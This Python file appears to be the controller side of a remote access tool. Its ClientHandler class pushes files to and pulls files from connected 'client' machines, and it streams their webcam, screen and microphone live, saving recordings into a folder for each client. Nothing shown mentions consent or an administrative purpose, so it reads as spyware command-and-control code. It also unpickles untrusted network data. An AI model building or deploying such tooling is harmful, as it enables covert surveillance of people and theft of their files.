import os
import time
from datetime import datetime
from IPython.display import clear_output
import socket
import sys
import cv2
import matplotlib.pyplot as plt
import pickle
import numpy as np
import struct 
import zlib
from PIL import Image, ImageOps
import pyaudio
import wave
import keyboard
import mute_alsa



class ClientHandler:



        #sends file from server to client machine
        def send_file(self, conn, usrFile):
            try:
                if not os.path.exists(usrFile):
                    print("[-]File does not exist!!!")
                    conn.send(str(" ").encode()) #get client current working directory
                else:
                    fileSize = os.path.getsize(usrFile)
                    conn.send(str(fileSize).encode())
                    time.sleep(2)
                    if fileSize == 0:
                        print("[-]File is empty!!!")
                        conn.send(str(" ").encode())
                    else:
                        with open(usrFile, 'rb') as file:
                            data = file.read(1024)
                            if fileSize < 1024:
                                conn.send(data)
                                file.close()
                            else:
                                while data:
                                    conn.send(data)
                                    data = file.read(1024)
                                file.close()
            except:
                print("[-]Unable to send file!!!")




        #recieves file from client machine
        def receive_file(self, conn, client_folder, client_id, usrFile):
            usrFile = os.path.join(client_folder, client_id, usrFile)

            try:   
                fileSize = int(conn.recv(1024).decode())
                if fileSize == 0:
                    print("File is empty!!!")
                else:
                    with open(usrFile, 'wb') as file:
                        if fileSize < 1024:
                            data = conn.recv(1024)
                            file.write(data)
                            file.close()
                            print("[+]Data received!!!")
                        else:
                            data = conn.recv(1024)
                            totalFileRecv = len(data)
                            while totalFileRecv < fileSize:
                                totalFileRecv += len(data)
                                file.write(data)
                                data = conn.recv(1024)
                            file.write(data)
                            file.close()
                            print("[+]File received!!!")
            except:
                print("[-]Unable to receive file!!!")




        #receives images from the client machine
        def receive_client_image(self, client_folder, client_id, client_sock_object):
            try:
                image_name = client_sock_object.recv(1024).decode()
                path = os.path.join(client_folder, client_id, image_name + ".jpg")

                with open(path, 'wb') as file:
                    fileSize = int(client_sock_object.recv(1024).decode())#accept and decode image file size
                    time.sleep(1)
                    data = client_sock_object.recv(1024) #accept and decode length of data received
                    totalFileRecv = len(data)
                    #recieve all data until there no more data to receive
                    while totalFileRecv < fileSize:
                        totalFileRecv += len(data)
                        file.write(data)
                        data = client_sock_object.recv(1024)
                    file.close()
                print("[+]Image received!!!")

            except:
                print("[-]Unable to receive image!!!")




        #receives live webcam feed from client, outputs recording live on screen and writes stream to client folder
        def live_webcam_feed(self, conn):
                cam_data = b""
                exitSignal = "noexit"
                payload_size = struct.calcsize(">L")
                print("[+] Press q to quit...")

                try:
                       
                    while len(cam_data) < payload_size:   

                            cam_data += conn.recv(4096)
                            if exitSignal == "exit":
                                conn.send(exitSignal.encode())
                                excess = conn.recv(20000)
                                cv2.destroyAllWindows()
                                break
                            else:
                                conn.send(exitSignal.encode())

                            if not cam_data:
                                cv2.destroyAllWindows()
                               
                                continue
                            # receive image row data form client socket
                            packed_msg_size = cam_data[:payload_size]
                            cam_data = cam_data[payload_size:]
                            msg_size = struct.unpack(">L", packed_msg_size)[0]
                            while len(cam_data) < msg_size:                                 
                                cam_data += conn.recv(4096)

                            frame_data = cam_data[:msg_size]
                            cam_data = cam_data[msg_size:]
                            # unpack image using pickle 
                            frame=pickle.loads(frame_data, fix_imports=True, encoding="bytes")
                            frame = cv2.imdecode(frame, cv2.IMREAD_COLOR)
                            frame = cv2.resize(frame, (1000, 500))
                            cv2.imshow('Webcam',frame)

                            key = cv2.waitKey(33)

                            if key == 113:
                                exitSignal = "exit"
                                        
                except:
                    print("[-]Closing Webcam")





        #receives live screen feed from client, outputs recording live on screen and writes stream to client folder
        def live_screen_feed(self, conn):
            data = b""
            msg_size = ""

            payload_size = struct.calcsize(">L")
            exitSignal = "noexit"
            print("[+] Press q to quit...")

            try:

                while True:
                    while len(data) < payload_size:
                        #print("Recv: {}".format(len(data)))
                        data += conn.recv(60000)
                        if exitSignal == "exit":
                            conn.send(exitSignal.encode())
                        else:
                            conn.send(exitSignal.encode())

                    packed_msg_size = data[:payload_size]
                    data = data[payload_size:]
                    msg_size = struct.unpack(">L", packed_msg_size)[0]

                    while len(data) < msg_size:
                        data += conn.recv(60000)
                    frame_data = data[:msg_size]
                    data = data[msg_size:]

                    frame=pickle.loads(frame_data, fix_imports=True, encoding="bytes")

                    cv2.imshow('ScreenFeed',frame)

                    if exitSignal == "exit":
                        cv2.destroyAllWindows()
                        break

                    key = cv2.waitKey(33)

                    if key == 113:
                        exitSignal = "exit"

            except Exception as e:
                print("Error occured while receiving data!!!")




        
        #receives live audio from client, outputs recording live and write stream to client folder
        def live_audio_feed(self, conn, client_folder, client_id):
            current_datetime = datetime.now()
            formatted_datetime = current_datetime.strftime("%Y-%m-%d %H:%M:%S")

            paudio = pyaudio.PyAudio()
            path = os.path.join(client_folder, client_id, formatted_datetime  + "_audiofeed.wav")

            chunk = 1024
            FORMAT = pyaudio.paInt16
            channels = 1
            sample_rate = 44100
            record_seconds = 5
            audio_frames = []

            exitSignal = "noexit"
            print("[+] Press q to quit...")

            # open stream object as input & output
            stream = paudio.open(format=FORMAT, channels=channels,
                            rate=sample_rate, input=True,
                            output=True, frames_per_buffer=chunk)

            data = b""
            payload_size = struct.calcsize("Q")

            while True:
                try:
                    while len(data) < payload_size:
                        packet = conn.recv(20000) 
                        if not packet: break
                        data+=packet

                        if exitSignal == "exit":
                            conn.send(exitSignal.encode())
                            break
                        else:
                            conn.send(exitSignal.encode())

                    packed_msg_size = data[:payload_size]
                    data = data[payload_size:]
                    msg_size = struct.unpack("Q",packed_msg_size)[0]
                    while len(data) < msg_size:
                        data += conn.recv(4*1024)
                    frame_data = data[:msg_size]
                    data  = data[msg_size:]

                    frame = pickle.loads(frame_data)
                    stream.write(frame)
                    audio_frames.append(frame)

                    if exitSignal == "exit":
                        break

                    if keyboard.is_pressed('q'):
                        exitSignal = "exit"

                except Exception as e:
                    print(e)   
                    break

            stream.stop_stream() # stop and close stream
            stream.close() # terminate pyaudio object
            paudio.terminate() 

            # save audio file
            wf = wave.open(path, 'wb')
            wf.setnchannels(channels)
            wf.setsampwidth(paudio.get_sample_size(FORMAT))
            wf.setframerate(sample_rate)
            wf.writeframes(b''.join(audio_frames))
            wf.close()
            
            

